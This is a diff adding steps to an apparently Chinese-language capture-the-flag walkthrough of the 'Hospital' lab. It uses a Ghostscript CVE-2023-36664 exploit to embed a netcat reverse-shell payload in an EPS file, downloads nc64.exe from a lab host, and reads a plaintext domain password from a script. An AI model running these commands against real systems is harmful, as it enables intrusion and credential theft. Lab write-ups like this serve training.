@@ -558,6 +558,19 @@ Hospital Webmail
 python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.37:8000/nc64.exe -o nc64.exe" --filename file.eps
 ```
 回复邮件,附带这个eps文件
+```bash
+python3 CVE_2023_36664_exploit.py --inject --payload "nc64.exe 10.10.16.37 4444 -e cmd.exe" --filename file.eps
+```
+反弹shell
+
+得到初始访问
+在Document目录下有一个ghostscript.bat
+```powershell
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+```
+> 这个命令的目的是在远程计算机上使用指定的凭据对象，在Ghostscript的安全环境下执行给定的EPS文件处理命令。请注意，这个命令中的一些路径和参数是根据具体环境和需求进行了示例设置，您可能需要根据实际情况进行修改。
+
+可以看到一个密码`chr!$br0wn`,猜测是用户`drbrown`的
 
 ### Pov
 #### user
